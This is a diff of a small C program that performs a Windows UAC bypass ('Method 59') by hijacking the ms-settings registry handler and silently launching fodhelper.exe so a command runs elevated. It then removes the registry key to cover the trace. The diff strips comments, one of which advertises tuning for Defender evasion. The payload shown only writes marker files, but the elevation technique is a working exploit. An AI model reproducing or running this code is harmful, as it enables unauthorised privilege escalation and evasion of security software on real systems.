@@ -2,7 +2,6 @@
 #include <stdio.h>
 
 int main() {
-    // Minimal APPINFO (Method 59 style) - tuned for Windows 11 25H2 + Defender evasion 2026
     const char* payload = "cmd.exe /c \"whoami > C:\\elevated_success.txt & echo UAC BYPASSED VIA METHOD 59 ON 25H2 > C:\\uac_bypassed.txt & timeout 5\"";
 
     HKEY hKey;
@@ -12,12 +11,10 @@ int main() {
         RegCloseKey(hKey);
     }
 
-    // Trigger elevation silently
     ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);
 
-    Sleep(8000);  // Give time for the elevated payload to run
+    Sleep(8000);
 
-    // Cleanup registry
     RegDeleteKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", KEY_ALL_ACCESS, 0);
 
     printf("[+] Method 59 executed. Check C:\\elevated_success.txt and C:\\uac_bypassed.txt\n");
